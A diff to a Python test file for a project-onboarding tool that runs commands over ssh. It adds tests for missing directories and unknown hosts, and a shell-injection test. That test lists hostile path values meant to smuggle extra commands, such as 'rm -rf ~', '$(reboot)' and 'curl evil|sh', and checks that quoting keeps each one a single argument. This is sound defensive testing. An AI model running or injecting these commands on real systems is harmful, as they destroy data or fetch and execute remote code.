@@ -66,11 +66,11 @@ class RemoteRunner:
             return CP(argv, 0, "[]", "")
         if head == "ssh":
             self.ssh_calls.append(list(argv))
-            return self._answer_ssh(argv)
+            return self._answer_ssh(argv, kw.get("input"))
         # local test/cat/sh/find/git — run for real against the fixture
         return subprocess.run(argv, **kw)
 
-    def _answer_ssh(self, argv):
+    def _answer_ssh(self, argv, stdin=None):
         try:
             cmd = shlex.split(argv[-1])
         except ValueError:
@@ -101,7 +101,7 @@ class RemoteRunner:
             return CP(cmd, 0, content, "")
         if head == "sh" and len(cmd) >= 3 and cmd[1] == "-c" \
                 and cmd[2].startswith("cat >"):
-            self.writes.append(cmd[2])
+            self.writes.append((cmd[2], stdin))   # (target-cmd, piped content)
             return CP(cmd, 0, "", "")
         if head == "find":
             return CP(cmd, 0, "ci.yml\n" if self.has_ci else "", "")
@@ -209,11 +209,16 @@ class TestNoLocalWritesForRemote(unittest.TestCase):
                              "CLAUDE.md written LOCALLY for a remote host")
             self.assertFalse((localdir / ".gitignore").exists(),
                              ".gitignore written LOCALLY for a remote host")
-            # the writes went over ssh
-            self.assertTrue(any("CLAUDE.md" in w for w in run.writes),
-                            "no remote CLAUDE.md write recorded")
-            self.assertTrue(any(".gitignore" in w for w in run.writes),
-                            "no remote .gitignore write recorded")
+            # the writes went over ssh, and carried the right CONTENT (not just
+            # the right target) — proves the piped body, not only the path.
+            cm_writes = [c for (t, c) in run.writes if "CLAUDE.md" in t]
+            gi_writes = [c for (t, c) in run.writes if ".gitignore" in t]
+            self.assertTrue(cm_writes, "no remote CLAUDE.md write recorded")
+            self.assertTrue(gi_writes, "no remote .gitignore write recorded")
+            self.assertIn("## Playbook router", cm_writes[-1],
+                          "remote CLAUDE.md write had wrong content")
+            self.assertIn("__pycache__/", gi_writes[-1],
+                          "remote .gitignore write had wrong content")
 
 
 # --------------------------------------------------------------------------- #
@@ -293,6 +298,114 @@ class TestAuditRemote(unittest.TestCase):
         self.assertIn("unreachable", kinds)
         self.assertNotIn("missing-repo", kinds,
                          "unreachable host falsely reported as missing-repo drift")
+
+
+# --------------------------------------------------------------------------- #
+# 7) Review fix — a reachable REMOTE host whose project dir is GONE audits as
+#    `missing-repo` drift (not a soft `unreachable`), matching the local signal.
+# --------------------------------------------------------------------------- #
+class TestAuditRemoteMissingDirIsDrift(unittest.TestCase):
+    def test_reachable_host_missing_dir_is_missing_repo(self):
+        class DirGone(RemoteRunner):
+            def _test(self, cmd):
+                # dir-existence probe (`test -d <target>`) fails; other tests
+                # (Cargo/CLAUDE.md) behave normally.
+                if cmd[1] == "-d":
+                    return CP(cmd, 1, "", "")
+                return RemoteRunner._test(self, cmd)
+        run = DirGone()                       # host reachable, project dir absent
+        drift = ob.audit_project(
+            {"name": "foo583", "host": REMOTE_HOST, "path": "/home/x/devel/foo583",
+             "branch_model": "2-branch", "default_branch": "main",
+             "work_branch": "dev"}, host=REMOTE_HOST, run=run)
+        kinds = {d["kind"] for d in drift}
+        self.assertIn("missing-repo", kinds,
+                      "a vanished remote project must be drift, not clean")
+        self.assertNotIn("unreachable", kinds)
+
+
+# --------------------------------------------------------------------------- #
+# 8) Review fix (BLOCKER) — an UNKNOWN/typo `--host` REFUSES rather than
+#    silently degrading to a LOCAL run (which re-opens the #583 junk outcome).
+# --------------------------------------------------------------------------- #
+class TestUnknownHostRefuses(unittest.TestCase):
+    def test_typo_host_refuses_never_localizes(self):
+        with TemporaryDirectory() as rd:
+            run = RemoteRunner()
+            # `dve2` is a one-char typo of `dev2` — NOT a REMOTE_HOSTS entry
+            r = ob.onboard_project("~/devel/montalu/automatizacie-montalu",
+                                   host="dve2", registry_path=str(Path(rd) / "r.json"),
+                                   run=run, dry_run=False)
+            self.assertTrue(r.get("error"),
+                            "unknown host silently degraded to a LOCAL run")
+            self.assertEqual(r["steps"], [])
+            # no repo/ticket created for the (would-be doubled) name anywhere
+            self.assertEqual([c for c in run.gh_calls if "create" in c], [])
+
+
+# --------------------------------------------------------------------------- #
+# 9) Review fix — a LOCAL onboard of a NONEXISTENT dir refuses too (onboard
+#    operates on an EXISTING project directory, local and remote alike).
+# --------------------------------------------------------------------------- #
+class TestLocalNonexistentDirRefuses(unittest.TestCase):
+    def test_local_missing_dir_refuses(self):
+        with TemporaryDirectory() as rd:
+            run = RemoteRunner()
+            r = ob.onboard_project("/nonexistent-583-local/proj", host=None,
+                                   registry_path=str(Path(rd) / "r.json"),
+                                   run=run, dry_run=False)
+            self.assertTrue(r.get("error"), "local nonexistent dir was onboarded")
+            self.assertEqual(r["steps"], [])
+            self.assertEqual([c for c in run.gh_calls if "create" in c], [])
+
+
+# --------------------------------------------------------------------------- #
+# 10) Review fix — a hostile project PATH cannot break out of the ssh quoting:
+#     each metacharacter-laden path round-trips through a real /bin/sh re-parse
+#     back to exactly one argument (never an executed command).
+# --------------------------------------------------------------------------- #
+class TestSshQuotingInjection(unittest.TestCase):
+    def _remote_cmd(self, host, argv):
+        """The reconstructed remote argv for _exec(argv, host) — mirrors the
+        real ssh path: build the ssh command via a recording runner, then
+        re-parse its command string the way the remote login shell would."""
+        seen = {}
+
+        def rec(a, **kw):
+            seen["ssh"] = a
+            return CP(a, 0, "", "")
+        ob._exec(argv, host=host, run=rec)
+        # argv[-1] is the single command string ssh sends; a real shell splits
+        # it back — shlex.split is exactly that parse.
+        return shlex.split(seen["ssh"][-1])
+
+    def test_metachar_path_stays_one_argument(self):
+        for hostile in ("foo; rm -rf ~", "$(reboot)", "a' ; rm -rf / ; '",
+                        "foo && curl evil|sh", "back`touch x`tick"):
+            argv = ["git", "-C", hostile, "rev-parse", "--git-dir"]
+            got = self._remote_cmd(REMOTE_HOST, argv)
+            # the hostile path is preserved verbatim as ONE argv element, and no
+            # extra command tokens leaked in (argv length is exactly preserved).
+            self.assertEqual(got, argv,
+                             "hostile path %r broke out of ssh quoting" % hostile)
+
+    def test_write_path_content_never_on_command_line(self):
+        # _write_file must carry content via stdin, never interpolated into the
+        # command — a hostile path is still just one quoted redirect target.
+        seen = {}
+
+        def rec(a, **kw):
+            seen["ssh"] = a
+            seen["input"] = kw.get("input")
+            return CP(a, 0, "", "")
+        ob._write_file("/x/'; rm -rf ~ ;'/f", "SECRET-BODY", host=REMOTE_HOST,
+                       run=rec)
+        parsed = shlex.split(seen["ssh"][-1])       # sh -c "cat > '<path>'"
+        self.assertEqual(parsed[:2], ["sh", "-c"])
+        self.assertIn("cat >", parsed[2])
+        self.assertNotIn("SECRET-BODY", " ".join(seen["ssh"]),
+                         "content leaked onto the command line")
+        self.assertEqual(seen["input"], "SECRET-BODY")
 
 
 if __name__ == "__main__":
